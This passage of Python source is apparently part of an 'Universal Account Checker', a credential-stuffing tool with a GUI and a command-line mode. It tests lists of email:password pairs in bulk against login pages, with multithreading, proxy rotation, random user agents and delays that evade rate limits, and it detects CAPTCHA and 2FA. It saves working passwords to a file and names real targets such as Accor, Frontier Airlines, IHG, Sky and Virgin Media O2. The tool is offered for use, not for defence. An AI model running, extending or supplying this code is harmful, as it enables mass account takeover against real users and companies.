                self.log_message("No accounts loaded from file")

    def browse_save_path(self):
        dirname = filedialog.askdirectory(title="Select folder to save results")
        if dirname:
            self.save_path_var.set(dirname)
    
    def browse_proxy_file(self, proxy_type):
        filename = filedialog.askopenfilename(
            title=f"Select {proxy_type.replace('_', ' ').title()}",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.proxy_files[proxy_type].set(filename)
    
    def log_message(self, message: str):
        """Add message to log"""
        self.log_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
        self.log_text.see(tk.END)
        self.root.update_idletasks()
    
    def update_progress(self, current: int, total: int):
        """Update progress bar and stats"""
        progress = (current / total) * 100 if total > 0 else 0
        self.progress_var.set(progress)
        
        stats = self.checker.stats
        self.stats_label.config(
            text=f"Checked: {stats['checked']} | Success: {stats['success']} | Failed: {stats['failed']} | "
                 f"Rate Limited: {stats['rate_limited']} | Captcha: {stats['captcha']} | "
                 f"2FA: {stats['2fa']} | Errors: {stats['errors']}"
        )
        
        # Update proxy stats
        proxy_count = self.checker.proxy_manager.get_proxy_count()
        use_proxies = self.use_proxies_var.get()
        proxy_type = self.proxy_type_var.get()
        
        if use_proxies and proxy_count > 0:
            self.proxy_stats_label.config(
                text=f"Proxies: {proxy_count} loaded | Type: {proxy_type} | Using: Yes"
            )
        else:
            self.proxy_stats_label.config(
                text=f"Proxies: {proxy_count} loaded | Type: {proxy_type} | Using: No"
            )
        
        self.root.update_idletasks()
    
    def start_checking(self):
        """Start the account checking process"""
        if not self.accounts_file.get():
            messagebox.showerror("Error", "Please select an accounts file")
            return
        
        # MODIFIED: Get default site URL
        default_site = self.default_site_var.get()
        if not default_site or default_site == "https://example.com":
             messagebox.showerror("Error", "Please enter a valid Default Site URL before starting.")
             return
        if not default_site.startswith(('http://', 'https://')):
            default_site = 'https://' + default_site
            self.default_site_var.set(default_site) # Update GUI
        
        # Load accounts
        accounts = self.checker.load_accounts(self.accounts_file.get())
        if not accounts:
            messagebox.showerror("Error", "No accounts loaded from file")
            return
        
        # Load proxies if enabled
        use_proxies = self.use_proxies_var.get()
        total_proxies = 0
        
        if use_proxies:
            proxy_configs = {}
            proxy_mapping = {
                'http_proxies_file': ProxyType.HTTP,
                'https_proxies_file': ProxyType.HTTPS,
                'socks4_proxies_file': ProxyType.SOCKS4,
                'socks5_proxies_file': ProxyType.SOCKS5,
                'residential_proxies_file': ProxyType.RESIDENTIAL,
                'datacenter_proxies_file': ProxyType.DATACENTER
            }
            
            for file_var, proxy_type in proxy_mapping.items():
                file_path = self.proxy_files[file_var].get()
                if file_path and os.path.exists(file_path):
                    proxy_configs[proxy_type] = file_path
            
            total_proxies = self.checker.proxy_manager.load_proxy_files(proxy_configs)
            
            if total_proxies == 0:
                response = messagebox.askyesno(
                    "No Proxies Loaded", 
                    "No proxies were loaded. Continue without proxies?", 
                    icon='warning'
                )
                if response:
                    use_proxies = False
                else:
                    return
        
        self.log_message(f"Starting check of {len(accounts)} accounts")
        self.log_message(f"Default Site: {default_site}")
        self.log_message(f"Using proxies: {use_proxies} ({total_proxies} loaded)")
        
        # Get settings
        try:
            max_workers = int(self.threads_var.get())
            timeout = int(self.timeout_var.get())
            delay_min = float(self.delay_min_var.get())
            delay_max = float(self.delay_max_var.get())
            proxy_type_name = self.proxy_type_var.get()
            proxy_type = ProxyType[proxy_type_name]
        except ValueError as e:
            messagebox.showerror("Error", f"Invalid settings: {e}")
            return
        
        # Update UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Reset stats
        self.checker.stats = {'checked': 0, 'success': 0, 'failed': 0, 'errors': 0, 
                             'rate_limited': 0, 'captcha': 0, '2fa': 0}
        self.progress_var.set(0)
        
        # Start checking in separate thread
        self.checking_thread = threading.Thread(
            target=self.run_mass_check,
            args=(accounts, default_site, max_workers, timeout, (delay_min, delay_max), use_proxies, proxy_type),
            daemon=True
        )
        self.checking_thread.start()
    
    def run_mass_check(self, accounts, default_site, max_workers, timeout, delay, use_proxies, proxy_type):
        """Run mass check in separate thread"""
        try:
            self.log_message(f"Starting mass check of {len(accounts)} accounts with {max_workers} threads")
            self.log_message(f"Settings: Timeout={timeout}s, Delay={delay[0]}-{delay[1]}s, Use Proxies={use_proxies}")
            
            for i, result in enumerate(self.checker.mass_check_accounts(
                accounts, default_site, max_workers, timeout, delay, use_proxies, proxy_type
            )):
                if result:
                    status_emoji = {
                        CheckStatus.SUCCESS: "✅",
                        CheckStatus.FAILED: "❌", 
                        CheckStatus.RATE_LIMITED: "⏰",
                        CheckStatus.CAPTCHA_REQUIRED: "🤖",
                        CheckStatus.TWO_FACTOR_REQUIRED: "🔐",
                        CheckStatus.UNKNOWN_ERROR: "❓"
                    }.get(result.status, "❓")
                    
                    proxy_info = f" [Proxy: {result.proxy_used}]"
                    self.log_message(f"{status_emoji} {result.site} - {result.email} - {result.status.value} ({result.response_time:.2f}s){proxy_info}")
                    self.update_progress(i + 1, len(accounts))
            
            self.log_message("Mass check completed!")
            
        except Exception as e:
            self.log_message(f"Error during mass check: {e}")
        
        finally:
            # Re-enable start button
            self.root.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
    
    def stop_checking(self):
        """Stop the checking process"""
        self.checker.stop_checking()
        self.log_message("Stopping check...")
        self.stop_button.config(state=tk.DISABLED)
    
    def clear_results(self):
        """Clear results log and preview"""
        self.log_text.delete(1.0, tk.END)
        self.progress_var.set(0)
        self.stats_label.config(text="Checked: 0 | Success: 0 | Failed: 0 | Rate Limited: 0 | Captcha: 0 | 2FA: 0 | Errors: 0")
        self.proxy_stats_label.config(text="Proxies: 0 loaded | Type: No proxies")
        
        # Clear preview
        self._clear_preview()
        
        # Reset checker stats
        self.checker.stats = {'checked': 0, 'success': 0, 'failed': 0, 'errors': 0, 
                             'rate_limited': 0, 'captcha': 0, '2fa': 0}
    
    def show_about(self):
        """Show about dialog with developer credits"""
        about_window = tk.Toplevel(self.root)
        about_window.title("About")
        about_window.geometry("600x500")
        about_window.resizable(False, False)
        
        frame = ttk.Frame(about_window, padding="20")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Credits text
        about_text = scrolledtext.ScrolledText(frame, height=20, width=70, wrap=tk.WORD)
        about_text.pack(fill=tk.BOTH, expand=True, pady=10)
        
        about_content = f"""{__credits__}

FEATURES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✓ Advanced Login Detection
  - Supports 60+ login path patterns
  - Detects Form, JSON API, OAuth authentication
  - Automatic CAPTCHA detection
  - SPA (React/Vue/Angular) support

✓ Site-Specific Configurations
  - Accor Hotels (all.accor.com)
  - Frontier Airlines (flyfrontier.com)
  - IHG Hotels (ihg.com)
  - Sky (sky.com)
  - Virgin Media O2 (virginmediao2.co.uk)
  - All Hearts Orders (allheartistsorders.com)

✓ Advanced Credential Checking
  - Multi-threaded processing (configurable)
  - Automatic retry on failures
  - Rate limiting protection
  - Proxy rotation support

✓ Proxy Support
  - HTTP/HTTPS/SOCKS4/SOCKS5
  - Automatic rotation
  - Performance tracking
  - Multiple proxy types

✓ Error Handling
  - Automatic retry with exponential backoff
  - Proxy error recovery
  - Rate limit detection
  - Comprehensive logging

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMMAND LINE USAGE:

Check Sites:
  python advancedchecker.py --check-sites site1.com site2.com

Check Credentials:
  python advancedchecker.py --check-creds creds.txt --site https://example.com

Advanced Options:
  --threads 20              # Number of threads
  --timeout 30              # Request timeout
  --delay-min 1.0           # Minimum delay
  --delay-max 3.0           # Maximum delay
  --proxies                 # Enable proxies
  --proxy-file proxies.txt  # Proxy file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For custom development, automation tools, or support:
📧 Contact: {__email__[0]}
💬 Telegram: {__telegram__}
📷 Instagram: {__instagram__}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        about_text.insert(tk.END, about_content)
        about_text.configure(state=tk.DISABLED)
        
        ttk.Button(frame, text="Close", command=about_window.destroy).pack(pady=10)
    
    def test_single_account(self):
        """Test a single account manually"""
        test_window = tk.Toplevel(self.root)
        test_window.title("Test Single Account")
        test_window.geometry("500x400")
        test_window.resizable(False, False)
        
        frame = ttk.Frame(test_window, padding="20")
        frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(frame, text="Site URL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        site_var = tk.StringVar(value=self.default_site_var.get())
        ttk.Entry(frame, textvariable=site_var, width=40).grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5, padx=(10, 0))
        
        ttk.Label(frame, text="Email:").grid(row=1, column=0, sticky=tk.W, pady=5)
        email_var = tk.StringVar()
        ttk.Entry(frame, textvariable=email_var, width=40).grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(10, 0))
        
        ttk.Label(frame, text="Password:").grid(row=2, column=0, sticky=tk.W, pady=5)
        password_var = tk.StringVar()
        ttk.Entry(frame, textvariable=password_var, width=40, show="*").grid(row=2, column=1, sticky=(tk.W, tk.E), pady=5, padx=(10, 0))
        
        use_proxy_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(frame, text="Use Proxy", variable=use_proxy_var).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=10)
        
        result_text = scrolledtext.ScrolledText(frame, height=10, width=60)
        result_text.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=10)
        
        def test_account():
            site = site_var.get()
            email = email_var.get()
            password = password_var.get()
            
            if not site or not email or not password:
                messagebox.showerror("Error", "Please enter site URL, email and password")
                return
            
            if not site.startswith(('http://', 'https://')):
                site = 'https://' + site
            
            use_proxy = use_proxy_var.get()
            proxy = self.checker.proxy_manager.get_proxy(ProxyType.ANY, use_proxy) if use_proxy else None
            
            result_text.delete(1.0, tk.END)
            result_text.insert(tk.END, f"Testing account on: {site}\n")
            result_text.insert(tk.END, f"Email: {email}\n")
            result_text.insert(tk.END, f"Using proxy: {use_proxy}\n")
            result_text.insert(tk.END, "Analyzing site and checking...\n")
            test_window.update()
            
            try:
                # Analyze site first
                result_text.insert(tk.END, "\nAnalyzing site...\n")
                config = self.checker.analyze_site(site, use_proxy)
                result_text.insert(tk.END, f"Detected auth method: {config.auth_method.value}\n")
                result_text.insert(tk.END, f"Login URL: {config.login_url}\n")
                result_text.insert(tk.END, f"Username field: {config.username_field}\n")
                result_text.insert(tk.END, f"Password field: {config.password_field}\n")
                if config.captcha_present:
                    captcha_info = f"Yes ({config.captcha_type or 'unknown'})"
                    if config.captcha_site_key:
                        short_key = config.captcha_site_key[:12] + "..." if len(config.captcha_site_key) > 12 else config.captcha_site_key
                        captcha_info += f" | key: {short_key}"
                else:
                    captcha_info = "No"
                result_text.insert(tk.END, f"CAPTCHA Detected: {captcha_info}\n")
                
                # Check account
                result_text.insert(tk.END, "\nChecking account...\n")
                result = self.checker.check_account(site, email, password, proxy, 30, use_proxy)
                
                result_text.insert(tk.END, f"\nResult: {result.status.value}\n")
                result_text.insert(tk.END, f"Response Time: {result.response_time:.2f}s\n")
                result_text.insert(tk.END, f"Auth Method: {result.auth_method.value}\n")
                result_text.insert(tk.END, f"Proxy Used: {result.proxy_used}\n")
                result_text.insert(tk.END, f"Response: {result.response}\n")
                
            except Exception as e:
                result_text.insert(tk.END, f"\nError: {str(e)}\n")
        
        ttk.Button(frame, text="Test Account", command=test_account).grid(row=5, column=0, columnspan=2, pady=10)

def main():
    if not GUI_AVAILABLE:
        print("GUI not available. Use --check-sites for headless mode.")
        print("Example: python3 advancedchecker.py --check-sites site1.com site2.com")
        sys.exit(1)
    root = tk.Tk()
    app = UniversalCheckerGUI(root)
    root.mainloop()

def _normalize_site(url: str) -> str:
    if not url:
        return url
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        return 'https://' + url
    return url


def quick_check_sites(sites: List[str], timeout: int = 15, use_proxies: bool = False):
    """Quickly analyze a list of sites for login/sign-in pages and print results.

    This runs in headless mode and is intended for command-line checks.
    """
    print(__credits__)
    checker = UniversalAccountChecker()
    results = []

    for raw_site in sites:
        site = _normalize_site(raw_site)
        print(f"\nChecking site: {site}")
        try:
            config = checker.analyze_site(site, use_proxies)
            login_url = config.login_url
            method = config.auth_method.value
            if config.captcha_present:
                captcha_info = f"Yes ({config.captcha_type or 'unknown'})"
                if config.captcha_site_key:
                    short_key = config.captcha_site_key[:16] + "..." if len(config.captcha_site_key) > 16 else config.captcha_site_key
                    captcha_info += f" | key: {short_key}"
            else:
                captcha_info = "No"

            # Try to fetch the login URL to see if it's reachable
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

            try:
                resp = session.get(login_url, timeout=timeout, allow_redirects=True)
                status_code = resp.status_code
                reachable = status_code == 200
            except Exception as e:
                status_code = None
                reachable = False
                logger.info(f"Error fetching login URL for {site}: {e}")

            print(f"  Detected login URL: {login_url}")
            print(f"  Auth method: {method}")
            print(f"  CAPTCHA detected on page: {captcha_info}")
            if status_code:
                print(f"  Login URL HTTP status: {status_code}")
            else:
                print(f"  Login URL HTTP status: Unreachable")

            # Basic form presence check
            form_present = False
            try:
                soup = BeautifulSoup(session.get(login_url, timeout=timeout, verify=False).text, 'html.parser')
                if soup.find('form'):
                    form_present = True
            except:
                form_present = False

            print(f"  Login form present: {form_present}")

            results.append({
                'site': site,
                'login_url': login_url,
                'auth_method': method,
                'captcha_info': captcha_info,
                'status_code': status_code,
                'form_present': form_present
            })

        except Exception as e:
            print(f"  Error analyzing site {site}: {e}")
            results.append({'site': site, 'error': str(e)})

    print('\nQuick check complete. Summary:')
    for r in results:
        site = r.get('site')
        if 'error' in r:
            print(f" - {site}: ERROR - {r['error']}")
        else:
            status = r.get('status_code') or 'Unreachable'
            form = 'Yes' if r.get('form_present') else 'No'
            print(f" - {site}: login_url={r.get('login_url')} status={status} form={form} captcha={r.get('captcha_info')}")


def check_credentials_from_file(creds_file: str, site_url: str, threads: int = 10, 
                               use_proxies: bool = False, proxy_file: str = None,
                               timeout: int = 30, delay_min: float = 1, delay_max: float = 3):
    """Check credentials from a file with threading and proxy support"""
    print(__credits__)
    print("\n" + "=" * 80)
    print("CREDENTIAL TESTING MODE")
    print("=" * 80)
    
    checker = UniversalAccountChecker()
    
    # Load proxies if specified
    if proxy_file and use_proxies:
        try:
            print(f"\nLoading proxies from {proxy_file}...")
            checker.proxy_manager.load_proxies_from_file(proxy_file)
            proxy_count = checker.proxy_manager.get_proxy_count()
            print(f"✓ Loaded {proxy_count} proxies")
        except Exception as e:
            print(f"✗ Error loading proxies: {e}")
            print("Continuing without proxies...")
            use_proxies = False
    
    # Load credentials
    print(f"\nLoading credentials from {creds_file}...")
    try:
        accounts = checker.load_accounts(creds_file)
        print(f"✓ Loaded {len(accounts)} credential pairs")
    except Exception as e:
        print(f"✗ Error loading credentials: {e}")
        return
    
    # Normalize site URL
    site_url = _normalize_site(site_url)
    
    # Analyze site first
    print(f"\nAnalyzing site: {site_url}")
    try:
        config = checker.analyze_site(site_url, use_proxies)
        print(f"✓ Site analyzed successfully")
        print(f"  • Auth method: {config.auth_method.value}")
        print(f"  • Login URL: {config.login_url}")
        print(f"  • Username field: {config.username_field}")
        print(f"  • Password field: {config.password_field}")
        if config.captcha_present:
            captcha_info = f"Yes ({config.captcha_type or 'unknown'})"
            if config.captcha_site_key:
                short_key = config.captcha_site_key[:16] + "..." if len(config.captcha_site_key) > 16 else config.captcha_site_key
                captcha_info += f" | key: {short_key}"
        else:
            captcha_info = "No"
        print(f"  • CAPTCHA detected: {captcha_info}")
        
        if config.captcha_present:
            print("\n⚠ WARNING: CAPTCHA detected! Success rate may be very low.")
            response = input("Continue anyway? (y/n): ")
            if response.lower() != 'y':
                print("Aborted.")
                return
    except Exception as e:
        print(f"✗ Error analyzing site: {e}")
        print("Attempting to continue with default configuration...")
    
    # Start checking
    print(f"\n{'='*80}")
    print(f"Starting credential check")
    print(f"  • Threads: {threads}")
    print(f"  • Timeout: {timeout}s")
    print(f"  • Delay: {delay_min}-{delay_max}s")
    print(f"  • Proxies: {'Enabled' if use_proxies else 'Disabled'}")
    print(f"{'='*80}\n")
    
    results = []
    start_time = time.time()
    
    try:
        for i, result in enumerate(checker.mass_check_accounts(
            accounts, site_url, threads, timeout, (delay_min, delay_max), use_proxies
        ), 1):
            # Print result
            status_symbol = "✓" if result.status == CheckStatus.SUCCESS else "✗"
            print(f"[{i}/{len(accounts)}] {status_symbol} {result.email} - {result.status.value} ({result.response_time:.2f}s)")
            
            results.append(result)
            
            # Print stats periodically
            if i % 10 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(f"\n--- Stats: {i}/{len(accounts)} checked ({rate:.1f}/sec) ---")
                print(f"Success: {checker.stats['success']} | Failed: {checker.stats['failed']} | " 
                      f"Errors: {checker.stats['errors']} | Rate Limited: {checker.stats['rate_limited']}\n")
    
    except KeyboardInterrupt:
        print("\n\n⚠ Interrupted by user. Stopping...")
        checker.stop_checking()
    
    # Final summary
    total_time = time.time() - start_time
    avg_rate = checker.stats['checked'] / total_time if total_time > 0 else 0.0
    print(f"\n{'='*80}")
    print("FINAL SUMMARY")
    print(f"{'='*80}")
    print(f"Total checked: {checker.stats['checked']}")
    print(f"✓ Success: {checker.stats['success']}")
    print(f"✗ Failed: {checker.stats['failed']}")
    print(f"⚠ Errors: {checker.stats['errors']}")
    print(f"⚠ Rate Limited: {checker.stats['rate_limited']}")
    print(f"⚠ CAPTCHA: {checker.stats['captcha']}")
    print(f"⚠ 2FA: {checker.stats['2fa']}")
    print(f"\nTotal time: {total_time:.2f}s")
    print(f"Average rate: {avg_rate:.2f} checks/sec")
    print(f"{'='*80}")
    
    # Save results
    results_file = Path(f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    
    try:
        with results_file.open('w', encoding='utf-8') as fh:
            fh.write("Universal Account Checker - Credential Test Results\n")
            fh.write(f"Generated: {datetime.now().isoformat()}\n")
            fh.write(f"Target site: {site_url}\n")
            fh.write(f"Total checked: {checker.stats['checked']}\n")
            fh.write(f"Success: {checker.stats['success']}\n")
            fh.write(f"Failed: {checker.stats['failed']}\n")
            fh.write(f"Errors: {checker.stats['errors']}\n")
            fh.write(f"Rate limited: {checker.stats['rate_limited']}\n")
            fh.write(f"CAPTCHA: {checker.stats['captcha']}\n")
            fh.write(f"2FA: {checker.stats['2fa']}\n")
            fh.write(f"Total time: {total_time:.2f}s\n")
            fh.write(f"Average rate: {avg_rate:.2f} checks/sec\n")
            fh.write("\nDetailed results:\n")

            if not results:
                fh.write("  No credential checks were performed.\n")
            else:
                for item in results:
                    fh.write(
                        f"- [{item.status.value}] {item.email} @ {item.site} "
                        f"in {item.response_time:.2f}s using {item.proxy_used}\n"
                    )
                    fh.write(f"  Password: {item.password}\n")
                    fh.write(f"  Auth method: {item.auth_method.value}\n")
                    fh.write(f"  Checked at: {item.timestamp.isoformat()}\n")
                    if item.response:
                        truncated = item.response.strip()
                        if len(truncated) > 500:
                            truncated = truncated[:500] + "...(truncated)"
                        fh.write(f"  Response: {truncated}\n")
                    fh.write("\n")

    except OSError as exc:
        print(f"\n⚠ Could not save results file: {exc}")
    else:
        print(f"\nResults saved to: {results_file}")


if __name__ == "__main__":
    import argparse
    
    # Check if using command-line arguments
    if len(sys.argv) > 1:
        # Headless CLI mode: --check-sites [site1 site2 ...]
        if '--check-sites' in sys.argv:
            idx = sys.argv.index('--check-sites')
            cli_sites = sys.argv[idx+1:]
            # If no sites provided, use a default list (from user request)
            if not cli_sites or cli_sites[0].startswith('--'):
                cli_sites = [
                    'all.accor.com',
                    'www.flyfrontier.com',
                    'allheartistsorders.com',
                    'sky.com',
                    'virginmediao2.co.uk',
                    'ihg.com'
                ]
            quick_check_sites(cli_sites, timeout=20, use_proxies=False)
        
        # Credential checking mode
        elif '--check-creds' in sys.argv:
            parser = argparse.ArgumentParser(description='Universal Account Checker - Credential Testing Mode')
            parser.add_argument('--check-creds', required=True, help='Credentials file (email:password or site:email:password per line)')
            parser.add_argument('--site', required=True, help='Target site URL')
            parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
            parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
            parser.add_argument('--delay-min', type=float, default=1.0, help='Minimum delay between requests (default: 1.0)')
            parser.add_argument('--delay-max', type=float, default=3.0, help='Maximum delay between requests (default: 3.0)')
            parser.add_argument('--proxies', action='store_true', help='Use proxies')
            parser.add_argument('--proxy-file', help='Proxy list file')
            
            args = parser.parse_args()
            
            check_credentials_from_file(
                args.check_creds,
                args.site,
                args.threads,
                args.proxies,
                args.proxy_file,
                args.timeout,
                args.delay_min,
                args.delay_max
            )
        else:
            print("Unknown command. Use --check-sites or --check-creds")
            print("\nExamples:")
            print("  python3 advancedchecker.py --check-sites site1.com site2.com")
            print("  python3 advancedchecker.py --check-creds creds.txt --site https://example.com --threads 20")
            sys.exit(1)
    else:
        # GUI mode
        main()